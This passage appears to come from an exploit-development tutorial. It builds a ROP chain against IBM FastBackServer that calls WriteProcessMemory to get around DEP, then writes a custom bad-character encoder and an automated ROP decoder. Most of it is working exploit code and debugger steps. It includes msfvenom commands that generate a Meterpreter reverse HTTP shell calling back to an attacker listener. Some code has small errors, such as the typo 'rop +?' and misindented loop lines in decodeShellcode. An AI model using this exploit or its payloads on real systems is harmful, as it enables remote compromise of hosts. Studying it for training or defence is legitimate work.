rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret 
rop +? pack("<L", (0xfffffdf4)) 	# -524
rop += pack("<L", (dllBase + 0x1d8c2)) # neg eax ; ret
rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
rop += pack("<L", (0x42424242)) # junk into esi
rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10

In the above ROP chain we first increase EAX (which points to lpBuffer on the stack) by four to align it with the nSize dummy argument.

Next, we save the updated EAX pointer by copying it to ESI. We do this because with our available gadgets, there's no simple way to obtain the shellcode size in ECX. Instead, we'll use EAX for this arithmetic and then copy the result to ECX.

For the last copy operation, we'll use a gadget that both copies the content of EAX into ECX and restores EAX from ESI. We have already encountered this gadget in the previous step. It contains a return instruction with an offset of 0x10, which we need to account for in the ROP chain (0x10 junk bytes).

Let's test this new step by restarting FastBackServer and attaching WinDbg. Once again, we'll set a breakpoint on the gadget that patches values on the stack. We'll continue execution until the breakpoint is triggered a second time.
	bp libeay32IBM019+0x1fd8
	g
	g
	p
	dd eax-14 L7


Excellent! Listing 54 shows that the ROP chain patched the nSize argument correctly.

At this point, we have correctly set up the address for WriteProcessMemory, the return address, and all arguments on the stack.

The last step in our ROP chain is to align EAX with the WriteProcessMemory address in the ROP skeleton on the stack, exchange it with ESP, and return into it.

We'll do this the same way we aligned EAX earlier. From Listing 54, we know that EAX points 0x14 bytes ahead of WriteProcessMemory on the stack. We can fix that easily with previously used gadgets. The updated ROP chain is shown below.

# Align ESP with ROP Skeleton
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
rop += pack("<L", (0xffffffec))         # -0x14
rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x5b415))  # xchg eax, esp ; ret
In the above ROP chain, we popped the value -0x14 (0xffffffec) into ECX, added it to EAX, and then used a gadget with an XCHG instruction to align ESP to the stack address stored in EAX.

After executing this part of the ROP chain, we should return into WriteProcessMemory with all the arguments set up correctly. We can observe this in practice by restarting FastBackServer, attaching WinDbg, and setting a breakpoint on the "XCHG EAX, ESP" gadget.
	bp libeay32IBM019+0x5b415
	g
	p
	p
	dds esp L6
	


shows that WriteProcessMemory was invoked and all arguments were set up correctly. We'll note that lpBuffer is stored at 0x110ee41c.

To verify that WriteProcessMemory copies our dummy shellcode, we can dump the contents of the code cave before and after the API executes.
	u 031f2c04
	pt
	u 031f2c04
	


The contents of the code cave before and after WriteProcessMemory execution show that our fake shellcode data of 0x44 bytes was copied from the stack into the code cave.

Let's return from WriteProcessMemory and prove that DEP was bypassed by executing the "INC ESP" instructions (0x44 opcode) from the code cave:
	r
	p
	p
	p


GETTING OUR SHELL

To complete our exploit, let's replace our padding data with a Meterpreter shellcode to get a reverse shell.

First, we'll need to find the offset from the end of the ROP chain to the lpBuffer stack address where our shellcode will reside. This value will be used to calculate the size of the padding area prepended to our shellcode. Next, we'll generate an encoded Meterpreter shellcode to replace the dummy shellcode.

To figure out the offset, we can display data at an address lower than the value in lpBuffer.

Earlier, we found lpBuffer at the stack address 0x110ee41c. If we subtract 0x70 bytes, we find the stack content shown
	dd 110ee41c-70
	? 110ee41c - 110ee3b0
	

Here we discover that the offset from the first DWORD after the ROP chain to lpBuffer is 0x6C bytes. We must add 0x6C bytes of padding before placing the shellcode.

Let's update our proof of concept with a second offset variable (offset2) and some dummy shellcode as shown below.
...
offset2 = b"C" * 0x6C
shellcode = b"\x90" * 0x100
padding = b"D" * (0x600 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+wpm+eip+rop+offset2+shellcode+padding,0,0,0,0)
buf += formatString
...

After these changes, lpBuffer will point to our dummy shellcode and WriteProcessMemory will copy the shellcode into the code cave.

To test the updated proof of concept, we'll restart FastBackServer, attach WinDbg, set a breakpoint on WriteProcessMemory, and launch the exploit:
	bp KERNEL32!WriteProcessMemoryStub
	g
	dds esp L6
	dd 0dcde41c-10 L8
	


By subtracting 0x10 bytes from lpBuffer, we can verify that our dummy shellcode starts exactly where lpBuffer points.

Next, let's generate windows/meterpreter/reverse_http shellcode with msfvenom, remembering to supply the bad characters 0x00, 0x09, 0x0A, 0x0C, 0x0D, and 0x20:
	msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
	
We can now insert the generated shellcode in the proof of concept using the shellcode variable.

Once again, we'll restart FastBackServer, attach WinDbg, and set a breakpoint on WriteProcessMemory. Listing 63 shows the results from WinDbg when the proof of concept is executed.
	bp KERNEL32!WriteProcessMemoryStub
	g
	pt
	u poi(esp)


Once we reach the beginning of WriteProcessMemory, we can execute the function to the end and dump the copied shellcode to verify that it's been copied to the code cave.

Unfortunately, after continuing execution, we encounter an access violation:


The highlighted assembly instruction attempted to modify a memory location pointed to by EAX+0x1A, which caused the crash.

From Listing 64 we notice that EAX points to an address within the code cave where the shellcode has been copied. We're encountering an access violation error because the shellcode's decoding stub expects the code to be stored in writable memory, but it is not.

This means we won't be able to use the msfvenom encoder, so we'll have to find a different solution. Fortunately, we have a few options.

We could write custom shellcode that does not contain any bad characters and by extension does not require a decoding routine. Alternatively, we could replace the bad characters and then leverage additional ROP gadgets to restore the shellcode before it's copied into the code section. In the next section, we'll pursue the latter approach.

Handmade ROP Decoder

At this point, we know we need to avoid bad characters in our shellcode and can not rely on the msfvenom decoder. In this section, we'll learn how to manually implement a ROP decoder and test it.

First, let's replace the bad characters with safe alternatives that will not break the exploit. To begin, we'll select arbitrary replacement characters, as shown in Listing 65.
0x00 -> 0xff
0x09 -> 0x10
0x0a -> 0x06
0x0b -> 0x07
0x0c -> 0x08
0x0d -> 0x05
0x20 -> 0x1f
To implement this technique, we'll first generate a windows/meterpreter/reverse_http payload in Python format (without encoding it):
	msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -f python -v shellcode
	
Since we're going to manually replace these characters for now, we'll only work on the first 20 bytes of the shellcode to determine if the technique works.

We can easily make these manual edits in our shellcode with a Python script. However, restoring the script with ROP at runtime is more challenging.

Let's start by creating a ROP chain to restore the first 0x00 byte, which was replaced with an 0xff byte.

Our complete ROP chain will perform three actions going forward. First, it will patch the arguments for WriteProcessMemory, then it will restore the shellcode, and finally, it will execute WriteProcessMemory.

Below is the ROP chain we'll use to restore the first bad character.
# Restore first three shellcode bytes
rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
rop += pack("<L", (negative value))	    # negative offset
rop += pack("<L", (dllBase + 0x4a7b6))  # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (original value))      # value into BH
rop += pack("<L", (dllBase + 0x468ee))  # add [eax+1], bh ; ret

This new ROP chain will be inserted just after the gadgets that patch nSize on the stack. At this point, EAX will contain the stack address where the nSize argument is stored. To align EAX with the first bad character to fix, we can pop an appropriate negative value into ECX and subtract it from EAX.
pop ecx ; ret
negative offset
sub eax, ecx ;

With EAX aligned, our next step is to restore the bad character. We will do this by loading an appropriate value into EBX and then adding the byte in BH to the value pointed to by EAX.
pop ebx ; ret
value into BH
add [eax+1], bh ; ret

For every bad character that we have to decode, we'll need to determine both the negative offset value to subtract from EAX and the value to place into BH.

First, let's find the correct value for BH. We are going to restore the bad character 0x00, which was replaced by the fourth byte in the shellcode, 0xff. We can add 0x01 to 0xff to restore the shellcode byte.

We can load the correct value in BH while avoiding bad characters by popping the value 0x1111__01__11 into EBX.

Next, let's calculate the negative offset. Recall that when the decoder ROP chain is executed, EAX points to nSize on the stack.

Before moving forward with this step, we need to make a couple of adjustments to our proof of concept that will influence the negative offset we have to calculate. For each bad character we fix, we'll be increasing the size of our final ROP chain. To account for this, we'll adjust the lpBuffer (shellcode) address on the stack to create enough additional space.

We will also increase the size of our entire input buffer to account for our larger combined offset and ROP chain. Listing 71 shows the first psCommandBuffer increased to 0x1100.
# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)      # opcode
buf += pack("<i", 0x0)        # 1st memcpy: offset
buf += pack("<i", 0x1100)    # 1st memcpy: size field
buf += pack("<i", 0x0)        # 2nd memcpy: offset
buf += pack("<i", 0x100)      # 2nd memcpy: size field
buf += pack("<i", 0x0)        # 3rd memcpy: offset
buf += pack("<i", 0x100)      # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)
Next, let's modify the address stored in lpBuffer.
# Patching lpBuffer
rop = pack("<L", (dllBase + 0x296f)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk into esi
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0x88888888))
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0x77777d78))
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
rop += pack("<L", (0x42424242)) # junk into esi
rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret 
...

In Listing 72, we increased the offset from the start of the ROP chain to the beginning of our shellcode (lpBuffer) from 0x100 to 0x600 by modifying the highlighted value.

Additionally, we must ensure that the subtraction we perform to align EAX with the ROP skeleton takes this 0x500 byte offset into account.
...
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0xfffff9e0)) # pop into eax
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret
...

This alignment is performed by adding the value 0xfffff9e0, which is 0x500 bytes less than the previous value of 0xfffffee0, as shown in Listing 73.

After this change, we must determine the negative offset from the stack address pointing to nSize to the first bad character in the shellcode. This calculation is tricky, so we'll find it dynamically instead.

As previously mentioned, at this point of the ROP chain execution, EAX contains the stack address of nSize. To locate the correct offset, we can pop a dummy value like 0xffffffff into ECX, which is then subtracted from EAX to perform the alignment. We will then use the debugger to determine the correct value to subtract at runtime.

Taking these modifications into consideration, we can craft the updated code shown in

# Restore first shellcode byte
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xffffffff))	
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (0x11110111)) # 01 in bh
rop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret

# Align ESP with ROP Skeleton
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xffffffec)) # -14
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret

offset2 = b"C" * (0x600 - len(rop))
shellcode = b"\xfc\xe8\x82\xff\xff\xff\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x08\x8b\x52"
padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+wpm+eip+rop+offset2+shellcode+padding,0,0,0,0)
buf += formatString

The lower part of Listing 74 includes the final changes, in which we have updated the offset2 variable to account for the increased size of psCommandBuffer and inserted the first 20 bytes of our custom-encoded shellcode.

Once execution of the ROP chain reaches the decoding section, we can find the distance from EAX to the first 0xff byte in the encoded shellcode.

Note that the instruction that decodes the bad character is "ADD [EAX+1], BH", which means we have to account for the additional one byte in our arithmetic calculation.

Listing 75 shows WinDbg's output when the ROP chain reaches the "POP ECX" gadget in the decode section.
	db eax + 61e L10
	? -61e
	



Through trial and error, the debugger output reveals a distance of 0x61e bytes from EAX to the first bad character. This means that we must pop the value of 0xfffff9e2 into ECX and subtract that from EAX.

Let's update the offset and rerun the proof of concept, so we can review the shellcode values on the stack before and after the decode instruction.
	db eax L2
	p
	db eax L2


From the output, we find the original character restored, which proves that the ROP decoding technique works.

Next, we'll reuse the ROP chain we just developed to restore the next bad character. The next bad character is another null byte, which is substituted with 0xff, and it comes just after the previous bad character. We can once again align EAX by modifying the value popped into ECX.

Since the next character to restore comes right after the previous character, we need to subtract the value 0xffffffff to increase EAX by one.

The ROP chain to accomplish this is shown in Listing 77.
# Restore second bad shellcode byte
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xffffffff))	
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (0x11110111)) # 01 in bh
rop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret

Next we'll restart FastBackServer, attach WinDbg, and set a breakpoint on libeay32IBM019+0x468ee to stop the execution at the "ADD [EAX+1], BH" instruction. Since we're interested in the second execution of the gadget, we must let execution continue the first time the breakpoint is hit.

Listing 78 shows the results when the breakpoint has been triggered twice.
	db eax-1 L3
	p
	db eax-1 L3
	


Automating the shellcode encoding

Our first step towards automation is implementing an encoding routine to modify the shellcode. We'll follow the scheme we used earlier, which is repeated below.
0x00 -> 0xff
0x09 -> 0x10
0x0a -> 0x06
0x0b -> 0x07
0x0c -> 0x08
0x0d -> 0x05
0x20 -> 0x1f

As part of the encoding routine, the script must keep track of the offsets where bytes are modified and how they are modified. Our script will reuse this information when the decoding ROP chain is created.

Let's separate these requirements into two methods. First, we'll detect all bad characters with the mapBadChars function. Next, we'll use the encodeShellcode function to encode the shellcode.

The code for mapBadChars is shown
def mapBadChars(sh):
        BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
        i = 0
        badIndex = []
        while i < len(sh):
                for c in BADCHARS:
                        if sh[i] == c:
                                badIndex.append(i)
                i=i+1
        return badIndex

mapBadChars accepts the shellcode as its only argument. Inside the method, we first list all the bad characters, then we create the badIndex array to keep track of the location of the bad characters that are discovered in the shellcode.

To discover the bad characters, we'll execute a while loop that iterates over all the bytes in the shellcode, comparing them with the list of bad characters. If a bad character is found, its index is stored in the badIndex array.

When all of the bad characters have been found, we're ready for encoding with encodeShellcode, as displayed in Listing 81.
def encodeShellcode(sh):
        BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
        REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
        encodedShell = sh
        for i in range(len(BADCHARS)):
                encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
        return encodedShell


Automating the ROP Decoder

our code must be able to handle an arbitrary amount of bad characters and arbitrary offsets, as well as a shellcode of unknown size.

Let's tackle this task by breaking it down into smaller actions. First, we'll align EAX with the beginning of the shellcode. Next, we will perform a loop over each of the bad characters found by mapBadChars and add a sequence of ROP gadgets to fix it. Finally, we'll need to reset EAX to point back to the ROP skeleton.

In the previous proof of concept, we aligned EAX by popping a negative value into ECX and subtracting it from EAX. We can reuse this same technique, but this time the subtraction of the value will point EAX to one byte before the start of the encoded shellcode. This way, our algorithm will be able to handle shellcode with a bad character as the first byte.

The value we subtracted from EAX in the last section was 0xfffff9e2, and the first bad character was at offset 3 into the shellcode. That means we must subtract an additional 3 bytes, or 0xfffff9e5, to align EAX with the beginning of the shellcode.

The updated alignment ROP chain

# Align EAX with shellcode
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xfffff9e5))	
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
Now that we have aligned EAX with the beginning of the shellcode, we need to create a method that dynamically adds a ROP chain for each bad character.

The generic ROP chain prototype is shown
rop += pack("<L", (dllBase + 0x117c))               # pop ecx ; ret
rop += pack("<L", (offset to next bad characters))
rop += pack("<L", (dllBase + 0x4a7b6))              # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (value to add))                   # values in BH
rop += pack("<L", (dllBase + 0x468ee))              # add [eax+1], bh ; ret

For each of these ROP chains, our code must calculate the offset from the previous bad character to the next. It must also ensure that the offset is popped into ECX, as highlighted in the listing above ("offset to next bad characters").

Because the value is subtracted from EAX, we'll need to use its negative counterpart.

We also need to add a value to the replacement character to restore the original bad character. We'll place this value into the second highlighted section from Listing 83. We must keep in mind that the value popped in EBX cannot contain a bad character, and only the byte in BH is used in the restore action.

Let's start developing the decoding scheme.

By performing the simple math shown in Listing 84, we obtain usable values for our decoding scheme.

0x01 + 0xff = 0x00
0xf9 + 0x10 = 0x09
0x04 + 0x06 = 0x0a
0x04 + 0x07 = 0x0b
0x04 + 0x08 = 0x0c
0x08 + 0x05 = 0x0d
0x01 + 0x1f = 0x20

Next we'll create the decodeShellcode method, which will use the values shown above to generate the ROP chain to decode the shellcode.

decodeShellcode will require three arguments; the base address of libeay32IBM019, the indexes of the bad characters in the shellcode, and the unencoded shellcode.

The code for decodeShellcode is shown in Listing 85.

def decodeShellcode(dllBase, badIndex, shellcode):
        BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
        CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01"
        restoreRop = b""
        for i in range(len(badIndex)):
                if i == 0:
                        offset = badIndex[i]
                else:
                        offset = badIndex[i] - badIndex[i-1]
                neg_offset = (-offset) & 0xffffffff
                value = 0
                for j in range(len(BADCHARS)):
                        if shellcode[badIndex[i]] == BADCHARS[j]:
                                value = CHARSTOADD[j]
                value = (value << 8) | 0x11110011

        restoreRop += pack("<L", (dllBase + 0x117c))    # pop ecx ; ret
        restoreRop += pack("<L", (neg_offset))
        restoreRop += pack("<L", (dllBase + 0x4a7b6))	# sub eax, ecx ; pop ebx ; ret
        restoreRop += pack("<L", (value))               # values in BH
        restoreRop += pack("<L", (dllBase + 0x468ee))   # add [eax+1], bh ; ret
        return restoreRop

First we'll list the possible bad characters and the associated characters we want to add. Next, we can create an accumulator variable (restoreRop) that will contain the entire decoding ROP chain.

Next, we need to perform a loop over all the bad character indexes. For each entry, we'll calculate the offset from the previous bad character to the current bad character. This offset is negated and assigned to the neg_offset variable and used in the ROP chain for the POP ECX instruction.

To determine the value to add to the replacement character, we can perform a nested loop over all possible bad characters to determine which one was present at the corresponding index. Once the value is found, it is stored in the value variable.

Since the contents of value must be popped into BH, we have to left-shift it by 8 bits. This will produce a value that is aligned with the BH register but contains NULL bytes. To solve the NULL byte problem, we will perform an OR operation with the static value 0x11110011.

Finally, the result is written to the ROP chain where it will be popped into EBX at runtime.

This complex process enables us to perform custom encoding that avoids bad characters during network packet processing. This process also allows us to decode the shellcode before it is copied to the non-writable code cave.

To use decodeShellcode, we'll call it just after the ROP chain that aligns EAX with the beginning of the shellcode.
# Align EAX with shellcode  
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xfffff9e5))	
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (0x42424242)) # junk into eb

rop += decodeShellcode(dllBase, pos, shellcode)

# Align ESP with ROP Skeleton
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xffffffec)) # -14
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret

offset2 = b"C" * (0x600 - len(rop))
padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(encodedShellcode))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+wpm+eip+rop+offset2+encodedShellcode+padding,0,0,0,0)
buf += formatString

With the proof of concept updated, let's restart FastBackServer, attach WinDbg, and set a breakpoint on the ROP gadget where EAX is aligned with the shellcode. When the exploit is executed, we can verify our decoder in WinDbg:
	bp libeay32IBM019+0x4a7b6
	g
	p
	db eax L10
	g
	p
	db eax L10
	


Listing 87 shows that the first time the breakpoint is hit, EAX is aligned with the beginning of the shellcode (minus one byte, to account for the offset in the write gadget).

The second time the breakpoint is triggered, EAX becomes aligned with the first replacement character. At this point, we can step through the decoding routine and restore the bad character in the shellcode.
	p
	p
	p
	db eax L10
	


In Listing 88, we stepped through the decoding routine for the first bad character and found that the ROP chain restored it correctly.

Let's allow execution to continue, triggering the breakpoint an additional two times. We can then check the contents of the shellcode after executing the decoding routine against two more bad characters:
	db 149de91e L10

These results confirm that our process is working, since our exploit has dynamically detected the three bad characters, replaced them, and generated the required ROP decoder.

We're now ready to replace the truncated shellcode with our complete shellcode. Our exploit will dynamically encode and decode the shellcode to avoid bad characters and decode the payload in the non-writable code cave.

Our exploit can decode the shellcode, but we are still missing a final step. We need to restore EAX to the start of the ROP skeleton before we execute the XCHG ROP gadget.

If we restart FastBackServer, attach WinDbg, and set a breakpoint on the gadget that aligns EAX with the shellcode (libeay32IBM019+0x4a7b6), we can find the distance from the ROP skeleton to EAX, as shown in Listing 90.
	dd eax-62f L7

Through trial and error, we discover that the difference from EAX to the start of the ROP skeleton is 0x62f.

We can add this value to the index of the last bad character to dynamically determine the distance from EAX when the ROP chain completes the decoding process.

The updated ROP chain segment in Listing 91 calculates the required offset.
# Align ESP with ROP Skeleton
skeletonOffset = (-(pos[len(pos)-1] + 0x62f)) & 0xffffffff
rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
rop += pack("<L", (skeletonOffset))    # dynamic offset
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret
The offset stored in the skeletonOffset variable is found from the last entry of the array of indexes associated with the bad characters.

To verify that the dynamically-found offset is correct, let's restart FastBackServer, attach WinDbg, and set a breakpoint on the "XCHG EAX, ESP" ROP gadget. Then, we'll run the updated exploit.
	bp libeay32IBM019+0x5b415
	g
	dd eax L7
	


We find that EAX has been correctly realigned with the address for WriteProcessMemory, which is stored on the stack.

Once EAX is aligned with the ROP skeleton and the XCHG ROP gadget is executed, our exploit has performed all the steps required to execute WriteProcessMemory and copy the decoded shellcode into the code cave.

As a final proof that the exploit works, we can set up a Metasploit multi/handler and execute our exploit without WinDbg attached.

![image](https://github.com/user-attachments/assets/b749c0f5-8cf5-427d-9637-623504a1a8ca)
